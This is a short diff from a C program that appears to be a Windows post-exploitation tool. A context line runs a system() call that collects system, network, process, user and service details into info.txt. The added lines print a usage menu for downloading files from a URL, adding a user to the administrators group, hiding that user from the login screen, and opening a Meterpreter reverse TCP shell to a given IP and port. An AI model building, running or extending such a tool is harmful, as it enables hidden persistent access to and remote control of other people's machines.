@@ -258,6 +258,11 @@ int main(int argc, char* argv[])
 		system("systeminfo>info.txt && ipconfig>>info.txt && netstat -aon>>info.txt && tasklist>>info.txt && net user>>info.txt && fsutil fsinfo drives>>info.txt&& wmic service list>>info.txt");
 		printf("Enter info.txt ok");
 	}
+	else
+	{
+		printf(" [-h help]\n [-d url filename | download file] \n [-u user pass | add user and Join the administrator group ] \n [-s user | Login interface does not display user] \n [-r ip port |windows/meterpreter/reverse_tcp] \n [-i | system message]");
+		exit(1);
+	}
 
     return 0;
 }
